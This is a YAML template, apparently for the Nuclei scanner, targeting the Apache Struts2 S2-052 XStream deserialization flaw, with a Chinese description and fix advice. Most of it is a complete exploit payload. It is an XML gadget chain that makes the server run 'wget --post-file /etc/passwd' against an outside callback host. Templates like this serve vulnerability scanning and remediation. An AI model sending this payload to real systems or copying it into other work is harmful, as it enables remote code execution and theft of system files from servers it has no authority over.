id: S2-052
info:
  name: Apache Struts2 S2-052 - Remote Code Execution
  author:
  - 折跃
  description: |-
    Struts2 S2-052 远程命令执行
    当Struts2使用了Struts2-Rest-Plugin插件时，如果http请求的Content-type为application/xml，则会使用XStreamHandler解析器实例化XStream对象来反序列化处理我们传入的XML数据，且在默认情况下是可以引入任意对象的（针对1.5.x以前的版本），因此我们可以通过反序列化引入任意类造成远程命令执行漏洞
  severity: critical
  remediation: |-
    #### 官方修复方案：
    升级系统至无漏洞版本，或于官网下载安全补丁。

    #### 临时修复方案：
    如果系统没有使用Struts REST插件，那么可以直接删除Struts REST插件，或者在配置文件中加入如下代码，限制服务端文件的扩展名
    ```
    <constant name=”struts.action.extension” value=”xhtml,,json” />
    ```
requests:
- matchers:
  - type: word
    condition: and
    words:
    - Debugging information
    - com.thoughtworks.xstream.converters.collections.MapConverter
  - type: status
    status:
    - 500
  matchers-condition: and
  path:
  - '{{BaseURL}}/struts2-rest-showcase/orders/3'
  - '{{BaseURL}}/orders/3'
  method: POST
  body: |
    <map>
      <entry>
        <jdk.nashorn.internal.objects.NativeString>
          <flags>0</flags>
          <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
            <dataHandler>
              <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                <is class="javax.crypto.CipherInputStream">
                  <cipher class="javax.crypto.NullCipher">
                    <initialized>false</initialized>
                    <opmode>0</opmode>
                    <serviceIterator class="javax.imageio.spi.FilterIterator">
                      <iter class="javax.imageio.spi.FilterIterator">
                        <iter class="java.util.Collections$EmptyIterator"/>
                        <next class="java.lang.ProcessBuilder">
                          <command>
                            <string>wget</string>
                            <string>--post-file</string>
                            <string>/etc/passwd</string>
                  <string>{{interactsh-url}}</string>
                          </command>
                          <redirectErrorStream>false</redirectErrorStream>
                        </next>
                      </iter>
                      <filter class="javax.imageio.ImageIO$ContainsFilter">
                        <method>
                          <class>java.lang.ProcessBuilder</class>
                          <name>start</name>
                          <parameter-types/>
                        </method>
                        <name>asdasd</name>
                      </filter>
                      <next class="string">asdasd</next>
                    </serviceIterator>
                    <lock/>
                  </cipher>
                  <input class="java.lang.ProcessBuilder$NullInputStream"/>
                  <ibuffer></ibuffer>
                  <done>false</done>
                  <ostart>0</ostart>
                  <ofinish>0</ofinish>
                  <closed>false</closed>
                </is>
                <consumed>false</consumed>
              </dataSource>
              <transferFlavors/>
            </dataHandler>
            <dataLen>0</dataLen>
          </value>
        </jdk.nashorn.internal.objects.NativeString>
        <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
      </entry>
      <entry>
        <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
        <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
      </entry>
    </map>
  headers:
    Content-Type: application/xml
